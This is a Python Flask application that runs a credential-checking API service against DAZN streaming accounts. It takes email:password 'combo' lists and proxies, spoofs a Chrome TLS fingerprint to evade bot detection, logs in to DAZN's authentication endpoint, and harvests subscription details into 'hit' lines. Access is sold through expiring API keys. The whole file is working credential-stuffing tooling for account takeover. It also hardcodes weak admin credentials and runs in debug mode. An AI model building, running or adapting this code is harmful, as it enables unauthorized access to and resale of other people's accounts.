"""
DAZN API – TLS fingerprinting, proxy support, admin panel, API keys.

Run:  pip install -r requirements.txt  &&  python app.py
Admin: https://your-domain.com/admin  (user=admin00, pass=admin00)
       Create API keys there; all endpoints require a valid key.

Endpoints (GET or POST; params in query or JSON/form body):
  /         – Echo params. Requires api_key. Response: JSON.
  /dazn     – DAZN combo check (hit, proxy). Requires api_key. Response: JSON { success, line, data, time }.
  /check    – Same as /dazn, always requires api_key. Response: JSON.
  /fetch    – TLS-fingerprinted GET to url. Requires api_key. Response: JSON.
  /admin    – Admin login & create API keys (no key needed).

Auth:  X-API-Key: <key>  header  OR  api_key=<key>  in query/body.
All responses are JSON in the body.
"""
import json
import os
import random
import secrets
import string
import time
from datetime import datetime, timedelta
from pathlib import Path

from flask import Flask, request, jsonify, Response, redirect, session, url_for
from urllib.parse import unquote

# TLS fingerprinting: use curl_cffi to impersonate Chrome
from curl_cffi import requests as tls_requests

app = Flask(__name__)
app.secret_key = os.environ.get("FLASK_SECRET_KEY", "change-me-in-production-" + secrets.token_hex(16))

# Admin panel credentials
ADMIN_USER = "admin00"
ADMIN_PASS = "admin00"

# API keys storage (same directory as app)
API_KEYS_FILE = Path(__file__).resolve().parent / "api_keys.json"

# Script (2).loli uses chrome_124; curl_cffi often has chrome120/chrome124
TLS_IMPERSONATE = "chrome120"

# Script (2).loli – SignIn: Chrome 144 headers + x-dazn-ua
SIGNIN_HEADERS_SCRIPT2 = {
    "Accept": "*/*",
    "Accept-Encoding": "gzip, deflate, br, zstd",
    "Accept-Language": "en,en;q=0.9",
    "Cache-Control": "no-cache",
    "Content-Type": "application/json",
    "Origin": "https://www.dazn.com",
    "Pragma": "no-cache",
    "Priority": "u=1, i",
    "Referer": "https://www.dazn.com/",
    "Sec-Ch-Ua": '"Not(A:Brand";v="8", "Chromium";v="144", "Google Chrome";v="144"',
    "Sec-Ch-Ua-Mobile": "?0",
    "Sec-Ch-Ua-Platform": '"Windows"',
    "Sec-Fetch-Dest": "empty",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Site": "cross-site",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36",
    "X-Dazn-Ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 signin/undefined hyper/0.14.0 (web; production; de)",
}

# Script (2).loli – Subscriptions: Chrome 112 style
SUBS_HEADERS_SCRIPT2 = {
    "Accept": "*/*",
    "Accept-Encoding": "gzip, deflate",
    "Cache-Control": "max-age=0",
    "Connection": "keep-alive",
    "Origin": "https://www.dazn.com",
    "Referer": "https://www.dazn.com/",
    "Sec-Ch-Ua": '"Chromium";v="112", "Google Chrome";v="112", "Not:A-Brand";v="99"',
    "Sec-Ch-Ua-Mobile": "?0",
    "Sec-Ch-Ua-Platform": '"Windows"',
    "Sec-Fetch-Dest": "empty",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Site": "cross-site",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36",
}


def parse_proxy(proxy_str: str):
    """
    Parse proxy string into requests-style proxy dict. Accepts:
    - ip:port
    - ip:port:user:pass (IPv6 ok: [::1]:port:user:pass)
    - user:pass@host:port
    - http://host:port, http://user:pass@host:port
    - https://..., socks4://..., socks5://...
    """
    if not proxy_str or not proxy_str.strip():
        return None
    s = proxy_str.strip()

    # Already a full URL
    if s.startswith("http://") or s.startswith("https://"):
        return {"http": s, "https": s}
    if s.startswith("socks4://") or s.startswith("socks5://"):
        return {"http": s, "https": s}

    # user:pass@host:port
    if "@" in s:
        auth, host_port = s.rsplit("@", 1)
        if ":" in auth:
            user, passwd = auth.split(":", 1)
            url = f"http://{user}:{passwd}@{host_port}"
        else:
            url = f"http://{auth}@{host_port}"
        return {"http": url, "https": url}

    # ip:port or ip:port:user:pass (split from right so IPv6 and colons in user/pass work)
    parts = s.split(":")
    if len(parts) == 2:
        return {"http": f"http://{s}", "https": f"http://{s}"}
    if len(parts) >= 4:
        passwd = parts[-1]
        user = parts[-2]
        host_port = ":".join(parts[:-2])
        url = f"http://{user}:{passwd}@{host_port}"
        return {"http": url, "https": url}

    return None


def _load_api_keys():
    """Load API keys from JSON file."""
    if not API_KEYS_FILE.exists():
        return []
    try:
        with open(API_KEYS_FILE, "r") as f:
            data = json.load(f)
            return data.get("keys", [])
    except Exception:
        return []


def _save_api_keys(keys):
    """Save API keys to JSON file."""
    with open(API_KEYS_FILE, "w") as f:
        json.dump({"keys": keys}, f, indent=2)


def _is_api_key_valid(key_value):
    """Check if API key exists and is not expired."""
    if not key_value:
        return False
    keys = _load_api_keys()
    now = datetime.utcnow()
    for k in keys:
        if k.get("key") == key_value:
            exp = k.get("expires")
            if exp:
                try:
                    exp_dt = datetime.fromisoformat(exp.replace("Z", "+00:00"))
                    if exp_dt.tzinfo:
                        exp_dt = exp_dt.replace(tzinfo=None)  # naive compare
                    if now > exp_dt:
                        return False
                except Exception:
                    pass
            return True
    return False


def _require_api_key():
    """Require valid API key for all API endpoints. Returns None if valid, else 401 Response with JSON body."""
    key = request.headers.get("X-API-Key") or _get_param("api_key")
    if _is_api_key_valid(key):
        return None
    body = json.dumps({
        "error": "Invalid or missing API key",
        "message": "Use X-API-Key header or api_key in body. Create keys at /admin.",
    })
    return Response(body, status=401, mimetype="application/json; charset=utf-8")


def _get_param(name, default=""):
    """Get param from GET query or POST body (JSON or form). Returns string."""
    if request.method == "POST":
        try:
            data = request.get_json(silent=True) if request.is_json else request.form.to_dict()
            if data and name in data:
                v = data.get(name)
                return (v or default) if v is None else str(v).strip()
        except Exception:
            pass
    return (request.args.get(name) or default).strip()


def _get_params():
    """Get all params as dict: from GET args or POST body (JSON or form)."""
    if request.method == "POST":
        try:
            if request.is_json:
                return request.get_json(silent=True) or {}
            return request.form.to_dict()
        except Exception:
            return {}
    return request.args.to_dict()


def fetch_with_tls_fingerprint(url: str, proxy=None, timeout=10.0):
    """
    GET request using TLS fingerprint (browser impersonation).
    Uses curl_cffi so the request has a real browser TLS/JA3 fingerprint.
    """
    try:
        r = tls_requests.get(
            url,
            impersonate=TLS_IMPERSONATE,
            proxies=proxy,
            timeout=timeout,
        )
        return {"status_code": r.status_code, "text": r.text[:500], "ok": r.ok}
    except Exception as e:
        return {"error": str(e), "ok": False}


def parse_combo(combo_str):
    """Parse combo/hit string email:password into (email, pass). Handles single colon only."""
    if not combo_str or ":" not in combo_str:
        return None, None
    s = combo_str.strip()
    idx = s.find(":")
    if idx == -1:
        return None, None
    return s[:idx].strip(), s[idx + 1 :].strip()


def _rand_hex(n):
    return "".join(random.choices("0123456789abcdef", k=n))


def _rand_device_id():
    return _rand_hex(24)


def _rand_session_id():
    p = lambda n: _rand_hex(n)
    return f"{p(8)}-{p(4)}-{p(4)}-{p(4)}-{p(12)}"


def _rand_profiling_id():
    return _rand_hex(36)


def _parse_lr(text, left_delim, right_delim):
    """Parse value between left and right delimiters (first occurrence)."""
    if not text or left_delim not in text:
        return ""
    start = text.find(left_delim) + len(left_delim)
    end = text.find(right_delim, start)
    if end == -1:
        return text[start:].strip()
    return text[start:end].strip()


def dazn_check(email, password, proxy=None, timeout=25):
    """
    DAZN check from script (2).loli: SignIn (POST body/headers from script 2) then subscriptions v1.
    Returns (success, country, status, auto_renew, plan, currency, price, plan_period, expiry_date, error_msg, response_body).
    """
    device_id = _rand_device_id()
    session_id = _rand_session_id()

    signin_url = "https://authentication-prod.ar.indazn.com/v5/SignIn"
    # Script (2).loli uses v1/subscriptions
    subs_url = "https://myaccount-bff.ar.indazn.com/v1/subscriptions"

    # 1) SignIn – script (2).loli: body DeviceId, Email, Password, Platform only (no ProfilingSessionId)
    signin_body = {
        "DeviceId": device_id,
        "Email": email,
        "Password": password,
        "Platform": "android",
    }
    signin_headers = {
        **SIGNIN_HEADERS_SCRIPT2,
        "Host": "authentication-prod.ar.indazn.com",
    }
    try:
        r1 = tls_requests.post(
            signin_url,
            json=signin_body,
            impersonate=TLS_IMPERSONATE,
            proxies=proxy,
            timeout=timeout,
            headers=signin_headers,
        )
        body1 = r1.text
    except Exception as e:
        return False, "", "", "", "", "", "", "", "", str(e), ""

    if "InvalidPassword" in body1 or "InvalidPasswordFormat" in body1 or "InvalidEmailFormat" in body1 or "AccountBlocked" in body1:
        return False, "", "", "", "", "", "", "", "", "InvalidPassword", body1
    if r1.status_code == 403 or r1.status_code == 407:
        return False, "", "", "", "", "", "", "", "", f"HTTP {r1.status_code}", body1

    # Token: script (2) parses "{\"Token\":\"" ; also support "AuthToken":{"Token":"
    token = _parse_lr(body1, '{"Token":"', '"')
    if not token:
        token = _parse_lr(body1, '"AuthToken":{"Token":"', '"')
    if not token:
        return False, "", "", "", "", "", "", "", "", "No AuthToken", body1

    # 2) Subscriptions – script (2).loli: GET v1/subscriptions, Chrome 112 headers
    subs_headers = {
        **SUBS_HEADERS_SCRIPT2,
        "Authorization": f"Bearer {token}",
        "Host": "myaccount-bff.ar.indazn.com",
    }
    try:
        r2 = tls_requests.get(
            subs_url,
            impersonate=TLS_IMPERSONATE,
            proxies=proxy,
            timeout=timeout,
            headers=subs_headers,
        )
        body2 = r2.text
    except Exception as e:
        return False, "", "", "", "", "", "", "", "", str(e), body1

    # Parse: script (2) uses "status\":\"", "currency\":\"", "period\":\"", name\":\"", "price\":", "autoRenew\":", "termEndDate\":\"
    # Support both v1 and v2 response shapes
    country = _parse_lr(body2, '"countryOfSubscription":"', '"') or _parse_lr(body2, '"UserCountryCode":"', '"')
    status = _parse_lr(body2, '"status":"', '"')
    auto_renew_raw = _parse_lr(body2, '"autoRenew":', ',')
    if not auto_renew_raw:
        auto_renew_raw = _parse_lr(body2, '"isRenewalConsentGiven":', ',"')
    auto_renew = "true" if auto_renew_raw and auto_renew_raw.lower() == "true" else "false"

    plan = _parse_lr(body2, '"name":"', '"')
    if not plan:
        xd = _parse_lr(body2, 'tiers\":{\"currentPlan\":', '}')
        plan = _parse_lr(xd, '"name":"', '"') if xd else ""
    currency = _parse_lr(body2, '"currency":"', '"')
    if not currency:
        currency = _parse_lr(body2, '{"currency":"', '"')
    price = _parse_lr(body2, '"price":', ',')
    plan_period = _parse_lr(body2, '"period":"', '"')
    expiry_date = _parse_lr(body2, '"termEndDate":"', 'T')

    return True, country, status, auto_renew, plan, currency, price, plan_period, expiry_date, "", ""


def build_hit_line(email, pass_, country="", status="", auto_renew="", plan="", currency="", price="", plan_period="", expiry_date="", config_by="", time_taken=None):
    """Build hit response line: email:pass | Country = X | Status = X | ... | Time = X.XXs"""
    parts = [f"{email}:{pass_}"]
    if country is not None:
        parts.append(f"Country = {country}")
    if status is not None:
        parts.append(f"Status = {status}")
    if auto_renew is not None:
        parts.append(f"AutoRenew = {auto_renew}")
    if plan is not None:
        parts.append(f"Plan = {plan}")
    if currency is not None:
        parts.append(f"Currency = {currency}")
    if price is not None:
        parts.append(f"Price = {price}")
    if plan_period is not None:
        parts.append(f"PlanPeriod = {plan_period}")
    if expiry_date is not None:
        parts.append(f"ExpiryDate = {expiry_date}")
    if config_by is not None:
        parts.append(f"ConfigBy = {config_by}")
    if time_taken is not None:
        parts.append(f"Time = {time_taken}")
    return " | ".join(parts)


@app.route("/", methods=["GET", "POST"])
def api():
    """GET or POST: email, pass, hit (email:pass), proxy (optional). ?admin -> admin panel. Response: raw text or JSON."""
    if request.args.get("admin") is not None:
        return redirect(url_for("admin_login"))
    err = _require_api_key()
    if err:
        return err
    hit_raw = _get_param("hit")
    email = _get_param("email")
    pass_ = _get_param("pass")
    proxy_raw = _get_param("proxy")

    if hit_raw:
        hit_raw = unquote(hit_raw)
        hit_email, hit_pass = parse_combo(hit_raw)
        if hit_email is not None:
            email = hit_email
            pass_ = hit_pass
    if email:
        email = unquote(email)
    if pass_:
        pass_ = unquote(pass_)
    if proxy_raw:
        proxy_raw = unquote(proxy_raw)

    proxy = parse_proxy(proxy_raw)

    resp_format = _get_param("format").lower()
    if resp_format == "hit" or resp_format == "line":
        country = unquote(_get_param("Country"))
        status = unquote(_get_param("Status"))
        auto_renew = unquote(_get_param("AutoRenew"))
        plan = unquote(_get_param("Plan"))
        currency = unquote(_get_param("Currency"))
        price = unquote(_get_param("Price"))
        plan_period = unquote(_get_param("PlanPeriod"))
        expiry_date = unquote(_get_param("ExpiryDate"))
        config_by = unquote(_get_param("ConfigBy"))
        line = build_hit_line(
            email, pass_,
            country=country or "N/A",
            status=status or "N/A",
            auto_renew=auto_renew or "N/A",
            plan=plan or "N/A",
            currency=currency or "N/A",
            price=price or "N/A",
            plan_period=plan_period or "N/A",
            expiry_date=expiry_date or "N/A",
            config_by=config_by or "N/A",
        )
        return Response(json.dumps({"line": line}), mimetype="application/json; charset=utf-8")

    payload = {
        "email": email,
        "pass": pass_,
        "hit": f"{email}:{pass_}" if (email or pass_) else None,
        "proxy": proxy_raw or None,
        "proxy_parsed": proxy is not None,
    }

    check_url = _get_param("url")
    if check_url:
        check_url = unquote(check_url)
        result = fetch_with_tls_fingerprint(check_url, proxy=proxy)
        payload["tls_fingerprint_request"] = result

    return Response(json.dumps(payload), mimetype="application/json; charset=utf-8")


@app.route("/dazn", methods=["GET", "POST"])
def dazn():
    """DAZN check. GET or POST: hit=email:pass (or email+pass), proxy= (optional). Response: raw text."""
    err = _require_api_key()
    if err:
        return err
    hit_raw = _get_param("hit")
    email = _get_param("email")
    pass_ = _get_param("pass")
    proxy_raw = _get_param("proxy")

    if hit_raw:
        hit_raw = unquote(hit_raw)
        email, pass_ = parse_combo(hit_raw)
    else:
        email = unquote(email)
        pass_ = unquote(pass_)

    if not email or not pass_:
        return Response(json.dumps({"error": "email:pass required (hit= or email= & pass=)"}), status=400, mimetype="application/json; charset=utf-8")

    proxy_raw = unquote(proxy_raw) if proxy_raw else ""
    proxy = parse_proxy(proxy_raw)

    start = time.perf_counter()
    ok, country, status, auto_renew, plan, currency, price, plan_period, expiry_date, err, full_response = dazn_check(email, pass_, proxy=proxy)
    elapsed = time.perf_counter() - start
    time_str = f"{elapsed:.2f}s"
    config_by = "@XD_HR"

    if ok:
        line = build_hit_line(
            email, pass_,
            country=country or "N/A",
            status=status or "N/A",
            auto_renew=auto_renew,
            plan=plan or "N/A",
            currency=currency or "N/A",
            price=price or "N/A",
            plan_period=plan_period or "N/A",
            expiry_date=expiry_date or "N/A",
            config_by=config_by,
            time_taken=time_str,
        )
        body = json.dumps({
            "success": True,
            "line": line,
            "data": {"country": country, "status": status, "auto_renew": auto_renew, "plan": plan, "currency": currency, "price": price, "plan_period": plan_period, "expiry_date": expiry_date},
            "time": time_str,
        })
        return Response(body, mimetype="application/json; charset=utf-8")
    fail_line = f"{email}:{pass_} | Error = {err} | Time = {time_str}"
    body = json.dumps({
        "success": False,
        "line": fail_line,
        "error": err,
        "response": full_response or "",
        "time": time_str,
    })
    return Response(body, status=200, mimetype="application/json; charset=utf-8")


@app.route("/check", methods=["GET", "POST"])
def check():
    """DAZN check – API key required. GET or POST: api_key (or header), hit, email, pass, proxy. Response: JSON body."""
    key = request.headers.get("X-API-Key") or _get_param("api_key")
    if not _is_api_key_valid(key):
        return Response(json.dumps({"error": "Invalid or missing API key", "message": "Use X-API-Key header or api_key in body. Create keys at /admin."}), status=401, mimetype="application/json; charset=utf-8")

    hit_raw = _get_param("hit")
    email = _get_param("email")
    pass_ = _get_param("pass")
    proxy_raw = _get_param("proxy")

    if hit_raw:
        hit_raw = unquote(hit_raw)
        email, pass_ = parse_combo(hit_raw)
    else:
        email = unquote(email)
        pass_ = unquote(pass_)

    if not email or not pass_:
        return Response(json.dumps({"error": "email:pass required (hit= or email= & pass=)"}), status=400, mimetype="application/json; charset=utf-8")

    proxy_raw = unquote(proxy_raw) if proxy_raw else ""
    proxy = parse_proxy(proxy_raw)

    start = time.perf_counter()
    ok, country, status, auto_renew, plan, currency, price, plan_period, expiry_date, err, full_response = dazn_check(email, pass_, proxy=proxy)
    elapsed = time.perf_counter() - start
    time_str = f"{elapsed:.2f}s"
    config_by = "@XD_HR"

    if ok:
        line = build_hit_line(
            email, pass_,
            country=country or "N/A",
            status=status or "N/A",
            auto_renew=auto_renew,
            plan=plan or "N/A",
            currency=currency or "N/A",
            price=price or "N/A",
            plan_period=plan_period or "N/A",
            expiry_date=expiry_date or "N/A",
            config_by=config_by,
            time_taken=time_str,
        )
        body = json.dumps({
            "success": True,
            "line": line,
            "data": {"country": country, "status": status, "auto_renew": auto_renew, "plan": plan, "currency": currency, "price": price, "plan_period": plan_period, "expiry_date": expiry_date},
            "time": time_str,
        })
        return Response(body, mimetype="application/json; charset=utf-8")
    fail_line = f"{email}:{pass_} | Error = {err} | Time = {time_str}"
    body = json.dumps({
        "success": False,
        "line": fail_line,
        "error": err,
        "response": full_response or "",
        "time": time_str,
    })
    return Response(body, status=200, mimetype="application/json; charset=utf-8")


@app.route("/fetch", methods=["GET", "POST"])
def fetch():
    """GET or POST: url=..., proxy= (optional). Response: raw JSON."""
    err = _require_api_key()
    if err:
        return err
    url = _get_param("url")
    if not url:
        return Response('{"error": "Missing url parameter"}', status=400, mimetype="application/json; charset=utf-8")
    url = unquote(url)
    proxy_raw = _get_param("proxy")
    if proxy_raw:
        proxy_raw = unquote(proxy_raw)
    proxy = parse_proxy(proxy_raw)
    result = fetch_with_tls_fingerprint(url, proxy=proxy)
    return Response(json.dumps(result), mimetype="application/json; charset=utf-8")


# ---------- Admin panel ----------

def _admin_login_required(f):
    def wrap(*args, **kwargs):
        if not session.get("admin_logged_in"):
            return redirect(url_for("admin_login"))
        return f(*args, **kwargs)
    wrap.__name__ = f.__name__
    return wrap


@app.route("/admin", methods=["GET", "POST"])
def admin_login():
    """Admin login: user=admin00, pass=admin00. Then redirect to dashboard."""
    if request.method == "POST":
        user = (request.form.get("username") or "").strip()
        pass_ = (request.form.get("password") or "").strip()
        if user == ADMIN_USER and pass_ == ADMIN_PASS:
            session["admin_logged_in"] = True
            return redirect(url_for("admin_dashboard"))
        return _admin_page(login_error="Invalid username or password.")
    if session.get("admin_logged_in"):
        return redirect(url_for("admin_dashboard"))
    return _admin_page()


@app.route("/admin/dashboard")
def admin_dashboard():
    """Admin dashboard: create API key and list keys."""
    if not session.get("admin_logged_in"):
        return redirect(url_for("admin_login"))
    return _admin_page(dashboard=True)


@app.route("/admin/create-key", methods=["POST"])
def admin_create_key():
    """Create a new API key with validity."""
    if not session.get("admin_logged_in"):
        return redirect(url_for("admin_login"))
    validity = request.form.get("validity", "7")
    custom_date = (request.form.get("custom_expiry") or "").strip()
    label = (request.form.get("label") or "").strip() or "API Key"

    now = datetime.utcnow()
    if custom_date:
        try:
            exp_dt = datetime.fromisoformat(custom_date.replace("Z", ""))
            expires = exp_dt.isoformat() + "Z"
        except Exception:
            expires = (now + timedelta(days=7)).isoformat() + "Z"
    else:
        days = {"1": 1, "7": 7, "30": 30, "90": 90}.get(validity, 7)
        expires = (now + timedelta(days=days)).isoformat() + "Z"

    key_value = secrets.token_urlsafe(32)
    keys = _load_api_keys()
    keys.append({
        "key": key_value,
        "label": label,
        "created": now.isoformat() + "Z",
        "expires": expires,
    })
    _save_api_keys(keys)
    session["new_api_key"] = key_value
    session["new_key_expires"] = expires
    return redirect(url_for("admin_dashboard"))


@app.route("/admin/logout")
def admin_logout():
    session.clear()
    return redirect(url_for("admin_login"))


def _admin_page(login_error="", dashboard=False):
    new_key = session.pop("new_api_key", None)
    new_key_expires = session.pop("new_key_expires", None)
    keys = _load_api_keys() if dashboard else []
    now = datetime.utcnow()

    if not dashboard:
        html = f"""
<!DOCTYPE html>
<html>
<head><meta charset="utf-8"><title>Admin Login</title>
<style>
  * {{ box-sizing: border-box; }}
  body {{ font-family: system-ui; max-width: 360px; margin: 60px auto; padding: 20px; }}
  h1 {{ margin: 0 0 20px; font-size: 1.4rem; }}
  input {{ width: 100%; padding: 10px; margin: 8px 0; border: 1px solid #ccc; border-radius: 6px; }}
  button {{ width: 100%; padding: 12px; margin-top: 10px; background: #2563eb; color: white; border: none; border-radius: 6px; cursor: pointer; }}
  button:hover {{ background: #1d4ed8; }}
  .error {{ color: #dc2626; font-size: 0.9rem; margin-bottom: 10px; }}
</style>
</head>
<body>
  <h1>Admin Login</h1>
  {"<p class='error'>" + login_error + "</p>" if login_error else ""}
  <form method="post" action="/admin">
    <input type="text" name="username" placeholder="Username" required autocomplete="username">
    <input type="password" name="password" placeholder="Password" required autocomplete="current-password">
    <button type="submit">Login</button>
  </form>
</body>
</html>"""
        return Response(html, mimetype="text/html; charset=utf-8")

    # Dashboard
    key_rows = ""
    for k in keys:
        exp = k.get("expires", "")
        try:
            exp_dt = datetime.fromisoformat(exp.replace("Z", ""))
            expired = now > exp_dt
        except Exception:
            expired = False
        status = "Expired" if expired else "Valid"
        key_rows += f"<tr><td>{k.get('label', '')}</td><td><code>{k.get('key', '')[:16]}...</code></td><td>{exp}</td><td>{status}</td></tr>"

    new_key_block = ""
    if new_key:
        new_key_block = f"""
  <div style="background:#ecfdf5; border:1px solid #10b981; border-radius:8px; padding:14px; margin:16px 0;">
    <strong>New API key (copy now, it won't be shown again):</strong><br>
    <code style="word-break:break-all;">{new_key}</code><br>
    <small>Expires: {new_key_expires or 'N/A'}</small>
  </div>"""

    html = f"""
<!DOCTYPE html>
<html>
<head><meta charset="utf-8"><title>Admin - API Keys</title>
<style>
  * {{ box-sizing: border-box; }}
  body {{ font-family: system-ui; max-width: 720px; margin: 40px auto; padding: 20px; }}
  h1 {{ margin: 0 0 8px; font-size: 1.5rem; }}
  a {{ color: #2563eb; }} a:hover {{ text-decoration: underline; }}
  .logout {{ float: right; }}
  table {{ width: 100%; border-collapse: collapse; margin: 16px 0; }}
  th, td {{ padding: 10px; text-align: left; border-bottom: 1px solid #eee; }}
  th {{ background: #f8fafc; }}
  input, select {{ padding: 8px; margin: 4px 0; border: 1px solid #ccc; border-radius: 6px; }}
  button {{ padding: 10px 16px; background: #2563eb; color: white; border: none; border-radius: 6px; cursor: pointer; }}
  button:hover {{ background: #1d4ed8; }}
  .form-row {{ margin: 12px 0; }}
  label {{ display: inline-block; width: 120px; }}
</style>
</head>
<body>
  <h1>Admin – API Keys</h1>
  <a href="/admin/logout" class="logout">Logout</a>
  <p>Create API keys for clients. Use <code>X-API-Key</code> header or <code>api_key=</code> query on /dazn, /, /fetch.</p>
  {new_key_block}
  <form method="post" action="/admin/create-key" style="background:#f8fafc; padding: 16px; border-radius: 8px;">
    <h2 style="margin-top:0;">Create API Key</h2>
    <div class="form-row"><label>Label</label><input type="text" name="label" placeholder="e.g. Client A"></div>
    <div class="form-row">
      <label>Validity</label>
      <select name="validity">
        <option value="1">1 day</option>
        <option value="7" selected>7 days</option>
        <option value="30">30 days</option>
        <option value="90">90 days</option>
      </select>
      <span style="margin-left:10px;">or custom expiry (ISO date):</span>
      <input type="datetime-local" name="custom_expiry" style="margin-left:8px;">
    </div>
    <div class="form-row"><button type="submit">Create key</button></div>
  </form>
  <h2>Existing keys</h2>
  <table><thead><tr><th>Label</th><th>Key</th><th>Expires</th><th>Status</th></tr></thead><tbody>{key_rows or "<tr><td colspan='4'>No keys yet.</td></tr>"}</tbody></table>
</body>
</html>"""
    return Response(html, mimetype="text/html; charset=utf-8")


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=True)
